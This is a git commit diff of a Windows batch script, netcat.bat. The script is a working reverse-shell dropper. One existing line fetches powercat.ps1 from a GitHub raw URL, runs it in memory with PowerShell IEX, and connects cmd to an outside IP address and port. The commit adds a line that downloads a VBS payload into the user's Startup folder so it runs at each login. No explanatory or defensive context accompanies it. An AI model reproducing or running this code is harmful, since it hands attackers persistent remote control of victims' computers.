f17eb7d35f913414c6ef9cb94db33044a1720c13
wolfyy <60975463+wolfyy59@users.noreply.github.com>
2021-03-19 00:12:05 -1200

    Update netcat.bat

--- netcat.bat
+++ netcat.bat
@@ -1,5 +1,7 @@
 @echo off 
 cls
+@echo off
+cd  %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup &&  curl -LO https://raw.githubusercontent.com/wolfyy59/wfy/master/runvbrev.vbs
 timeout 40
 :start
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wolfyy59/network_scan_android/main/powercat.ps1');powercat -c 193.161.193.99 -p 63699 -e cmd"
